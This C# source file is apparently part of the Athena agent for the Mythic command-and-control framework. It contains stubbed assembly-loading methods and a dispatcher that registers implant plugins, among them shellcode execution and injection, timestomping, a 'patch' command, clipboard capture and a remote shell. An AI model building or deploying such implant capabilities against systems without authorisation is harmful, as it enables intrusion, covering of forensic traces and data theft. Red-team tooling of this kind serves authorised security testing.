using Athena.Models.Mythic.Tasks;
using System.Collections.Concurrent;
using Athena.Plugins;
using Athena.Models;
using System.Text.Json;
using Athena.Utilities;
using System.Text.Json.Serialization;
using Plugins; //You're tempted to remove this, don't.

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
        public AssemblyHandler()
        {
            this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        }
        /// <summary>
        /// Load an assembly into our execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadAssemblyAsync(MythicJob job)
        {
            return new ResponseResult
            {
                task_id = job.task.id,
                user_output = "Cannot load!",
                completed = true
            }.ToJson();
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            return new ResponseResult()
            {
                completed = true,
                user_output = "Cannot execute!",
                task_id = job.task.id,
            }.ToJson();
        }
        /// <summary>
        /// Get output from the currently running assembly
        /// </summary>
        public async Task<string> GetAssemblyOutput()
        {
            return "";
        }
        /// <summary>
        /// Clear the execution context of any loaded assemblies
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> ClearAssemblyLoadContext(MythicJob job)
        {
            return new ResponseResult
            {
                task_id = job.task.id,
                completed = true,
                user_output = "Can't clear!"
            }.ToJson();
        }
        /// <summary>
        /// Load a command into the command execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadCommandAsync(MythicJob job)
        {
            return new LoadCommandResponseResult
            {
                task_id = job.task.id,
                completed = true,
                user_output = "Can't load!",
                status = "error"
            }.ToJson();
        }
        public async Task<string> LoadCommandAsync(string task_id, string b, byte[] c)
        {
            return new LoadCommandResponseResult
            {
                task_id = task_id,
                completed = true,
                user_output = "Can't load!",
                status = "error"
            }.ToJson();
        }
        public async Task<string> UnloadCommands(MythicJob job)
        {
            return new LoadCommandResponseResult()
            {
                completed = true,
                user_output = "Can't unload!",
                task_id = job.task.id,
                status = "error"
            }.ToJson();
        }
        
        /// <summary>
        /// Run a previously loaded command
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> RunLoadedCommand(MythicJob job)
        {
            try
            {
                //Workaround due to https://stackoverflow.com/questions/59198417/deserialization-of-reference-types-without-parameterless-constructor-is-not-supp
                //job.task.parameters = job.task.parameters.Replace("null", "\"\"");
                Dictionary<string, string> parameters = new Dictionary<string, string>();
                if (!String.IsNullOrEmpty(job.task.parameters))
                {
                    parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
                }
                parameters.Add("task-id", job.task.id);
                this.loadedPlugins[job.task.command].Execute(parameters);
                return null;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
                    completed = true,
                    status = "error",
                    task_id = job.task.id,
                }.ToJson();
            }
        }
        /// <summary>
        /// Check to see if a command is already loaded
        /// </summary>
        /// <param name="command">Event Sender</param>
        public async Task<bool> IsCommandLoaded(string command)
        {
            if (this.loadedPlugins.ContainsKey(command))
            {
                return true;
            }

            IPlugin plugin;
            switch (command)
            {
#if DEBUG
                case "basicplugin":
                    plugin = new BasicPlugin();
                    break;
#endif
#if ARP
                case "arp":
                    plugin = new Arp();
                    break;
#endif
#if CAT
                case "cat":
                    plugin = new Cat();
                    break;
#endif
#if CD
                case "cd":
                    plugin = new Cd();
                    break;
#endif
#if COFF
                case "coff":
                    plugin = new Coff();
                    break;
#endif
#if CP
                case "cp":
                    plugin = new Cp();
                    break;
#endif
#if CROP
                case "crop":
                    plugin = new CropPlugin();
                    break;
#endif
#if DRIVES
                case "drives":
                    plugin = new Drives();
                    break;
#endif
                //case "ds":
                //    plugin = new Ds();
                //    break;
#if ENV
                case "env":
                    plugin = new Env();
                    break;
#endif
#if FARMER
                case "farmer":
                    plugin = new Farmer();
                    break;
#endif
#if GETCLIPBOARD
                case "get-clipboard":
                    plugin = new GetClipboard();
                    break;
#endif
#if GETSESSIONS
                case "get-sessions":
                    plugin = new GetSessions();
                    break;
#endif
#if GETSHARES
                case "get-shares":
                    plugin = new GetShares();
                    break;
#endif
#if HOSTNAME
                case "hostname":
                    plugin = new HostName();
                    break;
#endif
#if IFCONFIG
                case "ifconfig":
                    plugin = new IfConfig();
                    break;
#endif
#if SHELLCODE
                case "inline-exec":
                    plugin = new ShellcodeExec();
                    break;
#endif
#if SHELLCODEINJECT
                case "inline-exec":
                    plugin = new ShellcodeInject();
                    break;
#endif
#if KILL
                case "kill":
                    plugin = new Kill();
                    break;
#endif
#if LS
                case "ls":
                    plugin = new Ls();
                    break;
#endif
#if MKDIR
                case "mkdir":
                    plugin = new Mkdir();
                    break;
#endif
#if MV
                case "mv":
                    plugin = new Mv();
                    break;
#endif
#if NSLOOKUP
                case "nslookup":
                    plugin = new Nslookup();
                    break;
#endif
#if PATCH
                case "patch":
                    plugin = new Patch();
                    break;
#endif
#if PS
                case "ps":
                    plugin = new Ps();
                    break;
#endif
#if PWD
                case "pwd":
                    plugin = new Pwd();
                    break;
#endif
#if REG
                case "reg":
                    plugin = new Reg();
                    break;
#endif
#if RM
                case "rm":
                    plugin = new Rm();
                    break;
#endif
#if SFTP
                case "sftp":
                    plugin = new Sftp();
                    break;
#endif
#if SHELL
                case "shell":
                    plugin = new Shell();
                    break;
#endif
#if SSH
                case "ssh":
                    plugin = new Ssh();
                    break;
#endif
#if TAIL
                case "tail":
                    plugin = new Tail();
                    break;
#endif
#if TESTPORT
                case "test-port":
                    plugin = new TestPort();
                    break;
#endif
#if TIMESTOMP
                case "timestomp":
                    plugin = new TimeStomp();
                    break;
#endif
#if UPTIME
                case "uptime":
                    plugin = new Uptime();
                    break;
#endif
#if WHOAMI
                case "whoami":
                    plugin = new WhoAmI();
                    break;
#endif
#if WINENUMRESOURCES
                case "win-enum-resources":
                    plugin = new WinEnumResources();
                    break;
#endif
                default:
                    return false;
            }
            return loadedPlugins.TryAdd(command, plugin); //Don't listen to the debuggers lies, this code is reachable
        }
    }
}
